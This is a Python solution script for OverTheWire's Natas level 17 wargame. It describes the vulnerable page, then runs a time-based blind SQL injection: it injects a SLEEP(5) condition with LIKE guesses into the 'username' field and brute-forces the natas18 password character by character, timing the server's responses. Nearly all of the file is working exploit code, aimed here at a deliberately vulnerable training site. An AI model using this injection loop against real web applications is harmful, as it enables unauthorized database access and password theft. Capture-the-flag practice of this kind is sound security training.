import base64
import binascii
from tools import cryptotools
import requests
from requests.auth import HTTPBasicAuth
from secret.credentials import Credentials
import time


def main():
    level = 17
    level_about = 'In this level you can see a sourcecode of vulnerable website, which is quite handy. The page \n' \
                  'code will get raw input data from a form and paste it unparsed into a SQL query. We know \n' \
                  'structure of table users we need to extract password from. Unfortunately the page will return \n' \
                  'exactly the same "blank" result cause every echo is commented out. We can try to do a time \n' \
                  'base SQL injection to detect the result of our query by the time of server response. We will \n' \
                  'append SLEEP(5) - in AND condition with our guessing brute force password query to detect \n' \
                  'a good guess. If we guess the fragment of password in the like statement the second condition \n' \
                  'will execute which is simple sleep the query for 5 seconds.'

    print("Hi there!\nyou've just run natas level " + str(level) +
          " (http://overthewire.org/wargames/natas/). Credentials are available in the secrets/credentials.py")

    print("\n" + level_about + "\n\n")

    # Real solution starts here :-)
    level_credentials = HTTPBasicAuth('natas' + str(level), Credentials.natas_credentials['natas' + str(level)])
    search_string = 'years'
    payload = {'needle': search_string}

    all_characters = "abcdefghijklmnoqprstuvwxyzABCDEFGHIJKLMNOQPRSTUVWXYZ0123456789"

    password = ''
    found = 0
    i = 0
    time_delay = 0

    # TODO We can improve this code by detecting first all used chars in password, then loop through this chars only.
    while len(password) < 32:
        for char in all_characters:
            found = 0
            payload['username'] = 'natas18" AND password COLLATE latin1_bin like "' \
                                  + password + char + '%" and SLEEP(5) #'
            start = time.perf_counter()
            r = requests.get('http://natas17.natas.labs.overthewire.org/index.php?debug=1', params=payload,
                             auth=level_credentials)
            end = time.perf_counter()
            if end - start > 4:
                password += char
                found += 1
                print("i: " + str(i) + "       found pw: " + password)
                time.sleep(time_delay)
                break
        if found == 0:
            print('NOTHING FOUND FOR ' + password + '\nThe server might be overloaded try to increase time_delay.')
        i += 1

    print("Found password: " + password)

    return True


if __name__ == '__main__':
    main()
